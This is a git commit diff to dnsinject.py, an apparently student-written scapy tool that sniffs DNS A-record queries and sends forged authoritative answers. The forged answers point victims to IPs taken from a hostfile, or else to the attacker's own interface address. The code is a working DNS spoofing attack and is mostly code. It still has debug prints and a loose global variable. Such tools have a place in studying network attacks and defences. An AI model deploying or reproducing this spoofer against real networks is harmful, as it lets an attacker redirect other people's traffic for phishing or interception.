e35893d3bc0fc12684c33290553aa3913fde3253
Raunak Shah <raunakshah@Raunaks-MacBook-Pro.local>
2017-12-10 00:48:07 -0500

    oh well

--- dnsinject.py
+++ dnsinject.py
@@ -2,12 +2,16 @@ import sys
 import getopt
 import os
 import scapy.all as scapy
-
+import netifaces as ni
 
 hostfile_dict = {}
 def handle(packet):
-	print("So far")
+	global hostfile_dict
+	print(hostfile_dict)
 	if packet.haslayer(scapy.DNS):
+
+
+
 		print("So far")
 		orig_ip = packet.getlayer(scapy.IP)
 		orig_udp = packet.getlayer(scapy.UDP)
@@ -17,7 +21,13 @@ def handle(packet):
 		print("dst ip")
 		print(orig_ip.dst)
 		print(orig_dns.qd.qname)
-		
+		if hostfile_dict:
+			if (packet.getlayer(scapy.DNS).qd.qname) not in hostfile_dict.keys():
+				return
+			spoofed_rdata = hostfile_dict[orig_dns.qd.qname]
+		else:
+			ni.ifaddresses(dev)
+			spoofed_rdata =  ni.ifaddresses(dev)[ni.AF_INET][0]['addr']
 
 		if orig_dns.qr == 0 and orig_dns.qd.qtype == 1: #qr = 0 for Query and qtype = 1 for A record
 			spoofed_src_ip = orig_ip.dst
@@ -35,12 +45,11 @@ def handle(packet):
 			spoofed_qdcount = 1
 			spoofed_ancount = 1
 			spoofed_question = scapy.DNSQR(qname = orig_dns.qd.qname, qtype = orig_dns.qd.qtype, qclass = orig_dns.qd.qclass)
-			spoofed_answer = scapy.DNSRR(rrname = orig_dns.qd.qname, type = orig_dns.qd.qtype, rclass = orig_dns.qd.qclass, ttl = 40960, rdata = "172.160.54.65")
+			spoofed_answer = scapy.DNSRR(rrname = orig_dns.qd.qname, type = orig_dns.qd.qtype, rclass = orig_dns.qd.qclass, ttl = 40960, rdata = spoofed_rdata)   #/scapy.DNSRR(rrname = orig_dns.qd.qname, type = orig_dns.qd.qtype, rclass = orig_dns.qd.qclass, ttl = 40960, rdata = spoofed_rdata)
 
 			spoofed_IP = scapy.IP(src = spoofed_src_ip, dst = spoofed_dst_ip)
 			spoofed_UDP = scapy.UDP(sport = spoofed_src_port, dport = spoofed_dst_port)
 			spoofed_DNS = scapy.DNS(id = spoofed_id, qr = 1, opcode = spoofed_opcode, aa = 1, rd = spoofed_rd, ra = 0, z = 0, rcode = 0, qdcount = spoofed_qdcount, ancount = spoofed_ancount, qd = spoofed_question, an = spoofed_answer)
-
 			scapy.sendp(scapy.Ether()/spoofed_IP/spoofed_UDP/spoofed_DNS, iface = dev 	)
 			
 def hostfile_parser(hostfile):
@@ -48,12 +57,15 @@ def hostfile_parser(hostfile):
 	with open(hostfile, 'r') as file:
 		for line in file:
 			ip, sep, domain = line.partition(" ")
-			host[ip] = domain
+			host[(domain[:-1]+ ".").encode()] = ip
+			print(ip)
+			print(domain)
 	return host
 	
 if __name__ == "__main__":
 	cmdLineOptions = "i:h:"
 	options, bpf  = getopt.getopt(sys.argv[1:], cmdLineOptions)
+	dev = ni.gateways()['default'][ni.AF_INET][1]	
 	for op in options:
 		if "-i" in op[0]:
 			dev = op[1]
